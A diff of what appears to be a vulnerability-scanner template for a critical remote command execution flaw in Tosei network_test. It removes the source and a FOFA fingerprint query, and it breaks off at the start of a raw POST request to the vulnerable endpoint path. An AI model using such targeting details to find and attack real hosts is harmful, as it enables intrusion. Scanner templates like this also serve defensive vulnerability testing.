@@ -3,12 +3,8 @@ info:
   name: Tosei network_test存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uelwdah56ahb7d2e'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uelwdah56ahb7d2e
-    fofa: body="tosei_login_check.php"
 http:
 - raw:
   - 'POST /cgi-bin/login.php/cgi-bin/network_test.php HTTP/1.1
